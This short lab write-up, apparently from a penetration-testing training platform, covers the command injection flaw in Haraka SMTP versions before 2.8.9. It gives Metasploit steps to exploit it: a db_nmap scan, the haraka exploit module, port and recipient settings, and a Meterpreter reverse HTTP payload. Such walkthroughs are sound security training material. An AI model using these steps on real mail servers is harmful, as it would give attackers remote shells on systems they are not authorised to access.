
+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.

+ SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.

+ Haraka is an open source high performance SMTP server developed in Node.js.

+ The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to` V2.8.9` are vulnerable to command injection.

### How to exploit ?

1. Create workspace and perform a `db_nmap` scan.

2. Exploiting `Haraka` with command injection.
```
use exploit/linux/smtp/haraka
```
- Set `SRVPORT` to 9898
- Set `email_to`. In our case, it is  `root@attackdefense.tech`
- Set payload `linux/x64/meterpreter_reverse_http`